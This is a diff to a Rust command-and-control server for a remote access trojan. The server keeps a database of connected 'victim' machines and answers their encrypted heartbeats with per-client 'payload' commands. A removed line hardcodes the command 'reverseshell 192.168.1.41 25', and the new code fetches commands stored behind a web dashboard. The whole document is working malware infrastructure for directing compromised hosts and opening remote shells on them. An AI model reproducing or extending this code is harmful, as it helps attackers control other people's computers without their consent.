@@ -12,9 +12,7 @@ use serde::{Deserialize, Serialize};
 use rsa::{RsaPublicKey, RsaPrivateKey, pkcs8::FromPublicKey, pkcs8::ToPublicKey, PaddingScheme};
 use rand::rngs::OsRng;
 use rusqlite::{params, Connection, Result};
-use std::fs;
 use std::fs::File;
-use rusqlite::NO_PARAMS;
 
 #[cfg(test)]
 mod tests {
@@ -37,6 +35,9 @@ struct User{
     _addr: std::net::SocketAddr, 
 }
 
+struct Payload{
+    payload: String,
+}
 
 #[derive(Serialize, Deserialize, Debug)]
 struct Message{
@@ -136,11 +137,56 @@ async fn db_process (channel_snd: Sender<String>, mut channel_rcv : Receiver<Str
     }
 }
 
-// message type : global
-// message type : login
-// message type : private
-// message type : get_from_db
-// message type : set_from_db
+// message type : heartbeat
+// message type : payload
+//async fn process (mut user : User, channel_snd : Sender<String>, mut channel_rcv : Receiver<String>, srv_priv_key: RsaPrivateKey, clt_pub_key: RsaPublicKey, mut rng: OsRng) {
+//    // data from database
+//    let message_back_from_db = Message{
+//        user_sender: user.username.clone(),
+//        user_receiver: "".to_string(),
+//        message_type: "get_from_db".to_string(),
+//        message_content: "".to_string(),
+//    };
+//
+//    let json_message = serde_json::to_string(&message_back_from_db).unwrap();
+//    channel_snd.send(json_message).unwrap();
+//    loop{
+//        match channel_rcv.try_recv() {
+//            Ok(mut n) => {
+//                trim_newline(&mut user.username);
+//                trim_newline(&mut n);
+//                let from_json_message: Message = serde_json::from_str(&n).unwrap();
+//                if from_json_message.message_type == "login" {
+//                    let enc_data = clt_pub_key.encrypt(&mut rng, PaddingScheme::new_pkcs1v15_encrypt(), n.as_bytes()).unwrap();
+//                    user.stream.write(&enc_data).await.unwrap();
+//                }
+//            }
+//            Err(_) => {
+//            }
+//        }
+//        let mut data = vec![0; 1024];
+//        
+//        match user.stream.try_read(&mut data) {
+//            Ok(0) => {}
+
+//            Err(_e) => {}
+//        }
+//    }
+//}
+
+async fn get_payload (user : String) -> String {
+    let conn = Connection::open("/var/www/Dashboard/gui/central/datasave.db").unwrap();
+    let mut stmt = conn.prepare("SELECT payload FROM user WHERE name = :name").unwrap();
+    let mut query = stmt.query_map([":name", &user], |row| {
+        Ok(Payload {
+            payload: row.get(0)?,
+        })
+    }).unwrap();
+    let first_entry = query.next().unwrap();
+    let payload = first_entry.unwrap();
+    payload.payload
+}
+
 async fn process (mut user : User, channel_snd : Sender<String>, mut channel_rcv : Receiver<String>, srv_priv_key: RsaPrivateKey, clt_pub_key: RsaPublicKey, mut rng: OsRng) {
     // data from database
     let message_back_from_db = Message{
@@ -172,13 +218,11 @@ async fn process (mut user : User, channel_snd : Sender<String>, mut channel_rcv
             Ok(n) => {
                 let dec_data = srv_priv_key.decrypt(PaddingScheme::new_pkcs1v15_encrypt(), &data[..n]).expect("failed to decrypt");
                 assert_ne!(&dec_data, &data[..n]);
-                println!("read {} bytes", n);
-                println!("Heartbeat recieved");
                 let message_to_send = Message {
                     user_sender: "Server".to_string(),
-                    user_receiver:"user".to_string(),
+                    user_receiver: user.username.clone(),
                     message_type:  "payload".to_string(),
-                    message_content: "reverseshell 192.168.1.41 25".to_string(),
+                    message_content: get_payload(user.username.clone()).await,
                 };
                 let json_message = serde_json::to_string(&message_to_send).unwrap();
                 let enc_data = clt_pub_key.encrypt(&mut rng, PaddingScheme::new_pkcs1v15_encrypt(), json_message.as_bytes()).unwrap();
@@ -188,7 +232,6 @@ async fn process (mut user : User, channel_snd : Sender<String>, mut channel_rcv
         }
     }
 }
-
 
 #[tokio::main]
 async fn main() -> io::Result<()> {
@@ -266,27 +309,22 @@ async fn main() -> io::Result<()> {
             _addr: addr,
         };
         
-        let path = "/etc/kptain.ratz";
-        if !std::path::Path::new(&path).exists() {
-        fs::create_dir("/etc/kptain.ratz")?;
-        File::create("/etc/kptain.ratz/datasave.db")?;
-        let conn = Connection::open("/etc/kptain.ratz/datasave.db").unwrap();
-        
-        conn.execute(
-            "CREATE TABLE victim (
-            	logo TEXT,
-                id INTEGER PRIMARY KEY,
-                computername TEXT,
-                lanip TEXT,
-                wanip TEXT,
-                os TEXT,
-                lastseen TEXT,
-                hbstatus TEXT);",NO_PARAMS,);           
-                
-            }
+        let fp = "/var/www/Dashboard/gui/central/datasave.db";
+        if !std::path::Path::new(fp).exists() {
+            println!("On créer la base");
+            File::create("/var/www/Dashboard/gui/central/datasave.db")?;
+            let conn = Connection::open("/var/www/Dashboard/gui/central/datasave.db").unwrap();
+            
+            let _resp = conn.execute(
+                "CREATE TABLE user (
+                    id INTEGER PRIMARY KEY,
+                    name TEXT,
+                    ip TEXT,
+                    autre TEXT,
+                    payload TEXT );",[],);
         }
-        
-        let conn = Connection::open("/etc/kptain.ratz/datasave.db").unwrap();
+
+        let conn = Connection::open("/var/www/Dashboard/gui/central/datasave.db").unwrap();
         println!("{}, {}",user1.username,user1._addr);
         let socket_ddr: &str = &user1._addr.to_string();
         let croped : Vec<&str> = socket_ddr.split(":").collect();
@@ -296,7 +334,7 @@ async fn main() -> io::Result<()> {
         match verif {
             Ok(_n) =>{println!("client already exist");}
             Err(_) =>{
-                conn.execute("insert into user (name,ip,autre) values (:name,:ip,:port);",&[(":name", &user1.username.to_string() ),(":ip", &croped[0].to_string()),(":port", &croped[1].to_string())],);
+                let _resp =conn.execute("insert into user (name,ip,autre) values (:name,:ip,:port);",&[(":name", &user1.username.to_string() ),(":ip", &croped[0].to_string()),(":port", &croped[1].to_string())],);
                 println!("client added to db");
             }
         }
@@ -306,6 +344,7 @@ async fn main() -> io::Result<()> {
         let thread_rcv = chann_snd.subscribe();
         let priv_key_thread = priv_key.clone();
         let rng_thread = rng.clone();
+        println!("ping");
         tokio::spawn(async move {
             process(user1, thread_send, thread_rcv, priv_key_thread, client_public_key, rng_thread).await;
         });
